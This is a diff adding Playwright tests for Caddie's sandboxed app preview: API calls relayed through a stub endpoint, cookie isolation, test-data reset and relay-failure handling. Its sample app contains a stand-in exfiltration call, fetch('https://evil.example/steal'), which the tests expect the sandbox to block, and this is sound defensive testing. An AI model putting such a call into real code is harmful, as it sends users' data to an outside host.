@@ -131,3 +131,93 @@ test('non-HTML artifacts fail closed rather than execute as an app', async ({ pa
 	await expect(page.getByRole('alert')).toContainText('not an interactive app preview');
 	await expect(page.locator('iframe')).toHaveCount(0);
 });
+
+// --- apps with a server (Publish stage 2/3): the relay -------------------------
+// The generated app calls fetch('/api/...'); the opaque frame has no network,
+// so the component relays each call to Caddie's relay endpoint (SIMULATED here
+// by page.route, standing in for the Worker Loader runtime that
+// tests/preview-runtime.integration.test.ts covers under real workerd).
+
+const BACKEND_HTML = `<!doctype html><html><body><h1>Field notes</h1>
+<form id="add"><input aria-label="New note"><button>Save note</button></form><ul></ul><p id="status"></p><p id="egress"></p>
+<script>
+async function load() { const res = await fetch('/api/notes'); const notes = await res.json(); document.querySelector('ul').replaceChildren(...notes.map(function (n) { var li = document.createElement('li'); li.textContent = n.body; return li; })); document.querySelector('#status').textContent = 'loaded ' + res.status; }
+document.querySelector('form').addEventListener('submit', async function (e) { e.preventDefault(); const body = document.querySelector('input').value; const res = await fetch('/api/notes', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ body: body }) }); document.querySelector('#status').textContent = 'saved ' + res.status; document.querySelector('input').value = ''; await load(); });
+fetch('https://evil.example/steal').then(function () { document.querySelector('#egress').textContent = 'reached'; }, function (error) { document.querySelector('#egress').textContent = 'refused: ' + error.message; });
+load();
+</script></body></html>`;
+
+test('an app with a server reads and writes through the relay and keeps its own cookie', async ({ page }) => {
+	const notes: string[] = [];
+	const relayed: Array<{ method: string; path: string; headers: Array<[string, string]>; body: string | null }> = [];
+	let resets = 0;
+	await page.route('**/api/projects/project-one/workflow/preview/output-one', (route) => route.fulfill({ contentType: 'text/html', body: BACKEND_HTML }));
+	await page.route('**/api/projects/project-one/workflow/preview-data/reset', (route) => {
+		resets += 1;
+		notes.length = 0;
+		return route.fulfill({ contentType: 'application/json', body: '{"reset":true}' });
+	});
+	await page.route('**/api/projects/project-one/workflow/preview/output-one/app', async (route) => {
+		const request = route.request().postDataJSON() as (typeof relayed)[number];
+		relayed.push(request);
+		const json = (status: number, value: unknown, extra: Array<[string, string]> = []) =>
+			route.fulfill({
+				contentType: 'application/json',
+				body: JSON.stringify({ status, headers: [['content-type', 'application/json'], ...extra], body: Buffer.from(JSON.stringify(value)).toString('base64') }),
+			});
+		if (request.method === 'POST' && request.path === '/api/notes') {
+			notes.push(JSON.parse(Buffer.from(request.body ?? '', 'base64').toString('utf8')).body);
+			return json(201, { id: notes.length }, [['set-cookie', 'sid=abc123; Path=/; HttpOnly']]);
+		}
+		if (request.method === 'GET' && request.path === '/api/notes') return json(200, notes.map((body) => ({ body })));
+		return json(404, { error: 'not_found' });
+	});
+
+	await page.goto(`${base}/?backend`);
+	if (process.env.CADDIE_SHOTS_MOBILE) await page.setViewportSize({ width: 390, height: 844 });
+	const frame = page.frameLocator('iframe');
+	await expect(frame.locator('#status')).toHaveText('loaded 200');
+	await expect(page.getByTestId('preview-test-data-note')).toContainText('test data that only you see');
+
+	await frame.getByRole('textbox', { name: 'New note' }).fill('Plant maize after rain');
+	await frame.getByRole('button', { name: 'Save note' }).click();
+	await expect(frame.getByRole('listitem')).toHaveText(['Plant maize after rain']);
+	await expect(frame.locator('#status')).toHaveText('loaded 200');
+	if (process.env.CADDIE_SHOTS)
+		await page.screenshot({ path: join(process.env.CADDIE_SHOTS, `backend-preview${process.env.CADDIE_SHOTS_MOBILE ? '-mobile' : ''}.png`), fullPage: true });
+
+	// The POST carried its JSON body; the next request carried the app's own cookie.
+	const post = relayed.find((r) => r.method === 'POST')!;
+	expect(post.headers.find(([name]) => name === 'content-type')?.[1]).toContain('application/json');
+	const afterPost = relayed[relayed.indexOf(post) + 1]!;
+	expect(afterPost.headers.find(([name]) => name === 'cookie')?.[1]).toBe('sid=abc123');
+	// Caddie's own session cookie is never part of a relayed request.
+	expect(relayed.every((r) => !r.headers.some(([name, value]) => name === 'cookie' && value.includes('caddie')))).toBe(true);
+
+	// Other sites stay unreachable from the frame.
+	await expect(frame.locator('#egress')).toContainText("refused: The preview can only reach the app's own /api routes.");
+	expect(relayed.some((r) => r.path.includes('steal'))).toBe(false);
+
+	// Reset test data empties it and reloads the app.
+	await page.getByTestId('preview-reset-data').click();
+	await expect.poll(() => resets).toBe(1);
+	await expect(frame.getByRole('listitem')).toHaveCount(0);
+	await expect(frame.locator('#status')).toHaveText('loaded 200');
+});
+
+test('a relay failure reaches the app as a network error, not a crash', async ({ page }) => {
+	await page.route('**/api/projects/project-one/workflow/preview/output-one', (route) => route.fulfill({ contentType: 'text/html', body: BACKEND_HTML }));
+	await page.route('**/api/projects/project-one/workflow/preview/output-one/app', (route) =>
+		route.fulfill({ status: 503, contentType: 'application/json', body: JSON.stringify({ error: 'PREVIEW_RUNTIME_UNAVAILABLE', message: "Trying apps with a server needs Cloudflare's Worker Loader, which isn't available here." }) }),
+	);
+	const errors: string[] = [];
+	page.on('pageerror', (error) => errors.push(error.message));
+	await page.goto(`${base}/?backend`);
+	await expect(page.frameLocator('iframe').getByRole('heading', { name: 'Field notes' })).toBeVisible();
+	await expect(page.frameLocator('iframe').locator('#status')).toHaveText('');
+	// The sample app does not catch its own failed fetch, so the browser reports the
+	// rejection — carrying Caddie's plain explanation, exactly like a network error.
+	await expect.poll(() => errors).toContain("Trying apps with a server needs Cloudflare's Worker Loader, which isn't available here.");
+	// Caddie's own page keeps working around the preview.
+	await expect(page.getByRole('link', { name: 'Download app' })).toBeVisible();
+});
